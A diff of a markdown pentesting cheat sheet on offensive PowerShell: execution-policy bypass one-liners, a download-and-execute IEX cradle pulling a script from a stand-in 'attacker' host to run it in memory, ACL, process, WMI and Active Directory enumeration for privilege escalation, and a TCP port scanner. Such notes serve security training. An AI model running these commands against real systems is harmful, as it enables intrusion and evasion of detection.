@@ -1,70 +1,144 @@
-## PowerShell Location
-You’ll typically find the main `powershell.exe` binary here:
-```powershell
-C:\Windows\System32\WindowsPowerShell
+PowerShell is a powerful Windows scripting and automation framework widely used in system administration and penetration testing. It provides deep access to the OS, Active Directory, and .NET classes.
+
+The main PowerShell executable is typically located at:
+
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
 
+This binary can be invoked directly from `cmd.exe`, scripts, or remote shells.
 
 ---
 
-## Execution Policy Bypass
+## Execution Policy Bypass Techniques
 
-Windows uses _execution policies_ to restrict script execution. Attackers or pentesters often bypass these restrictions.
+Windows enforces execution policies to restrict script execution. In restricted environments (common in corporate domains or labs), scripts may not run by default.
 
-```powershell
+### Bypass Execution Policy (One-Liner)
+
+```bash
+powershell.exe -ep bypass
+```
+
+This launches a PowerShell session ignoring execution policy restrictions.
+
+### Spawn CMD via Bypass
+
+```bash
 powershell.exe -ExecutionPolicy Bypass cmd.exe
 ```
 
-Runs a new `cmd.exe` shell using PowerShell with the policy bypassed.
+This executes `cmd.exe` through a PowerShell instance with execution restrictions disabled.
 
-Set Execution Policy to Unrestricted
-```powershell
+### Unrestricted Execution
+
+```bash
 powershell.exe -ExecutionPolicy Unrestricted cmd.exe
 ```
-Opens `cmd.exe` through PowerShell with full script execution permissions. Risky on production systems.
 
+This allows full script execution. It is noisy and risky in real environments, often logged or monitored.
 
----
-## File and Folder Permissions
-You can inspect the permissions of files and directories using the `Get-Acl` cmdlet. This is helpful for identifying misconfigurations or excessive privileges that could be abused.
+### In-Memory Script Execution 
+
 ```powershell
-Get-Acl "C:\Program Files (x86)\<file_or_directory>" | Format-List
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
 ```
 
+This downloads and executes a script directly in memory, avoiding disk artifacts.
 
 ---
 
+## File and Folder Permission Enumeration
+
+PowerShell allows inspection of ACLs (Access Control Lists), which is useful for identifying privilege escalation paths.
+
+### Retrieve ACL Information
+
+```powershell
+Get-Acl "C:\Program Files (x86)\TargetFolder" | Format-List
+```
+
+This displays detailed permission entries, including users, groups, and rights.
+
+### Practical Use Case
+
+Look for:
+
+- Write permissions on sensitive directories
+    
+- Misconfigured services or binaries
+    
+- Weak permissions on startup scripts
+    
+
+---
 
 ## Process Enumeration
 
-Useful for situational awareness or identifying target processes.
+Enumerating running processes helps identify:
 
-#### List All Processes
-```powershell
-Get-Process | Sort-Object Unique | Select-Object ProcessName, Id
-```
+- Interesting applications (browsers, AV, services)
+    
+- Potential privilege escalation vectors
+    
+- Credentials in memory targets
+    
 
-Displays a list of all running processes, sorted uniquely by name and showing their process IDs.
-
-**Find Process Path (e.g., Firefox)**
-```powershell
-Get-Process firefox | Sort-Object Unique | Format-List Path
-```
-Gets detailed information on the Firefox process, including its file path.
-
---- 
-
-## System Information
-
-#### Get Operating System Details
+### List Running Processes
 
 ```powershell
-Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
+Get-Process | Sort-Object ProcessName -Unique | Select-Object ProcessName, Id
 ```
 
-Retrieves detailed information about the current OS using WMI (Windows Management Instrumentation). Useful for enumeration and privilege escalation checks.
+Displays unique processes with their IDs.
 
-## TCP Port Scanner
+### Retrieve Process Path
+
+```powershell
+Get-Process firefox | Format-List Path
+```
+
+Shows the full binary path of a specific process.
+
+---
+
+## System Enumeration via WMI
+
+WMI (Windows Management Instrumentation) provides detailed system information useful for enumeration and privilege escalation.
+
+### Retrieve OS Information
+
+```powershell
+Get-WmiObject -Class Win32_OperatingSystem | Select-Object *
+```
+
+This returns:
+
+- OS version
+    
+- Hostname
+    
+- Installed date
+    
+- Architecture
+    
+
+### Modern Alternative (Less Noisy)
+
+```powershell
+Get-CimInstance Win32_OperatingSystem
+```
+
+Preferred in modern environments due to better performance and lower detection.
+
+---
+
+## Network Enumeration with PowerShell
+
+PowerShell can be used for basic network scanning without external tools.
+
+### TCP Port Scanner
+
 ```powershell
 $target = "192.168.1.1"
 $ports = 1..1024
@@ -74,9 +148,38 @@ foreach ($port in $ports) {
     try {
         $tcp.Connect($target, $port)
         if ($tcp.Connected) {
-            Write-Host "Port $port is OPEN" -ForegroundColor Green
+            Write-Host "Port $port is OPEN"
             $tcp.Close()
         }
     } catch {}
 }
 ```
+
+### Practical Notes
+
+- Useful when tools like `nmap` are not available
+    
+- Slow compared to native scanners
+    
+- Works well in restricted environments (e.g., compromised hosts)
+    
+
+---
+
+## Active Directory Enumeration Context
+
+PowerShell is heavily used for AD enumeration, especially when tools like PowerView are available.
+
+Even without external modules, .NET classes can be leveraged:
+
+```powershell
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+```
+
+This provides domain-level information such as:
+
+- Domain controllers
+    
+- Forest structure
+    
+- Trust relationships
